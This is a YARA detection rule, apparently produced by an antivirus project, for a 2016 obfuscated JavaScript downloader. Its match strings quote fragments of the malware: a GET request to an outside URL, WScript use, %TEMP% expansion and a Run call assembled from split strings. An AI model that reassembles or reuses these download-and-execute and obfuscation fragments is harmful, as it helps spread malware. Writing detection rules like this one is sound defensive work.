rule sig_20160428_0a9d48810aeaec1d9cd0464b765f5597 {
  meta:
    description = "datamaliciousorder - file 20160428_0a9d48810aeaec1d9cd0464b765f5597.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7bc8849c37e45ab02b443b075e01ebc3918261ae1cdc7495e02671976797b16f"

  strings:
    $s1  = "FhmGwdQsaZibQyrKiwBry[ElgUwaJmvIdxTffIbdYme](\"G\" + \"ET\", \"http://switchright.com/2yshda\", false);" fullword ascii
    $s2  = "function TijFcnGbpThkDdiNegLiy(LcxEriVwtWyfEshZwdBkp){UlqSdqSnzFepTqrQijQsh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function TijFcnGbpThkDdiNegLiy(LcxEriVwtWyfEshZwdBkp){UlqSdqSnzFepTqrQijQsh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function AyfCzoDcoPsnErmBemFug() {return UlqSdqSnzFepTqrQijQsh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "var UlqSdqSnzFepTqrQijQsh = function QwgEaiSbfWppCtrKgaWia() {return XilFjaYwbIxiZbrHvgVgx[TucWmoLtaWjhNcmBvuWce](\"WScript\"+\"" ascii
    $s6  = "return PkuFocIquDuqScgVsfSxo - PgwKtoQdlEwfCqpGrhShc;};" fullword ascii
    $s7  = "function DanAurVhfXotNqeYetIbh() {return ((AttRufZgyGltSgjHubDsp == true) && (AttRufZgyGltSgjHubDsp == PmkKhoBnhGukBseEpdHzk)) ?" ascii
    $s8  = "function UwhWfoAgmPadLygOqjSey(PkuFocIquDuqScgVsfSxo, PgwKtoQdlEwfCqpGrhShc){YdvPxoSwtXfgMccGljQzo = YdvPxoSwtXfgMccGljQzo * 1; " ascii
    $s9  = "function DanAurVhfXotNqeYetIbh() {return ((AttRufZgyGltSgjHubDsp == true) && (AttRufZgyGltSgjHubDsp == PmkKhoBnhGukBseEpdHzk)) ?" ascii
    $s10 = "var UlqSdqSnzFepTqrQijQsh = function QwgEaiSbfWppCtrKgaWia() {return XilFjaYwbIxiZbrHvgVgx[TucWmoLtaWjhNcmBvuWce](\"WScript\"+\"" ascii
    $s11 = "var XilFjaYwbIxiZbrHvgVgx = this[\"WScript\"];" fullword ascii
    $s12 = "function AyfCzoDcoPsnErmBemFug() {return UlqSdqSnzFepTqrQijQsh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s13 = "if (FhmGwdQsaZibQyrKiwBry[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function UwhWfoAgmPadLygOqjSey(PkuFocIquDuqScgVsfSxo, PgwKtoQdlEwfCqpGrhShc){YdvPxoSwtXfgMccGljQzo = YdvPxoSwtXfgMccGljQzo * 1; " ascii
    $s15 = "function SvsIyjEhsWxuQjgNoeUpp(){return HkaYjdHtgNdkOqtBsmSfh + \"\";};" fullword ascii
    $s16 = "var PmkKhoBnhGukBseEpdHzk = false;" fullword ascii
    $s17 = "AttRufZgyGltSgjHubDsp = true; " fullword ascii
    $s18 = "function HtlXhsXfyRpdJzbLdmSfz()" fullword ascii
    $s19 = "var BmkStoVumHotJetDnaUpf = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "function CphUizEgnKpiSubNuhKwt(EsdQsmQpzOqoBwbByrXfc) {var IapYiwLzmPauLkiXlpVbg = (1, 2, 3, 4, 5, EsdQsmQpzOqoBwbByrXfc); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}